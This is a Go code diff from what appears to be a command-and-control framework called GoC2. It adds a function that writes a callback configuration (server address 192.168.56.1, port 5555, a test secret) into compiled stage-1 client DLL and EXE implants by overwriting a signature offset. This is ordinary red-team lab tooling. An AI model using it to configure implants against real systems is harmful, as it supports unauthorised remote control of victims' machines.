@@ -64,14 +64,14 @@ func MultiplyString(s string, count int) string {
 	return out
 }
 
-func PatchStage1Config() {
-	b, err := ioutil.ReadFile("C:\\Users\\Christopher\\Desktop\\GoC2\\bin\\clientDLL.dll")
+func PatchStage1ConfigDLL() {
+	b, err := ioutil.ReadFile("C:\\Users\\Christopher\\Desktop\\GoC2\\bin\\client.dll")
 	if err != nil {
 		log.Fatal(err)
 	}
 	// new config
 	conf := data.Config{}
-	conf.ServerHostName = "172.16.99.201"
+	conf.ServerHostName = "192.168.56.1"
 	conf.ServerPort = "5555"
 	conf.ServerSecret = "test"
 	stringConf, err := json.Marshal(conf)
@@ -87,11 +87,35 @@ func PatchStage1Config() {
 	ioutil.WriteFile("C:\\tmp\\malleableclient.dll", b, 0644)
 }
 
+func PatchStage1Config() {
+	b, err := ioutil.ReadFile("C:\\Users\\Christopher\\Desktop\\GoC2\\bin\\client.exe")
+	if err != nil {
+		log.Fatal(err)
+	}
+	// new config
+	conf := data.Config{}
+	conf.ServerHostName = "192.168.56.1"
+	conf.ServerPort = "5555"
+	conf.ServerSecret = "test"
+	stringConf, err := json.Marshal(conf)
+	if err != nil {
+		log.Fatal(err)
+	}
+	// find offset
+	configOffset := findSignature(b, []byte(Signature))
+	if configOffset == 0 {
+		log.Fatal(fmt.Errorf("Failed to find signature %s", Signature))
+	}
+	replaceSignature(b, stringConf, configOffset)
+	ioutil.WriteFile("C:\\tmp\\malleableclient.exe", b, 0644)
+}
+
 func PatchStage0Config() {
 	// patch stage zero PIC here. ?
 	// probably just patch where stage 1 is located and user agent etc.
 }
 
 func main() {
+	PatchStage1ConfigDLL()
 	PatchStage1Config()
 }
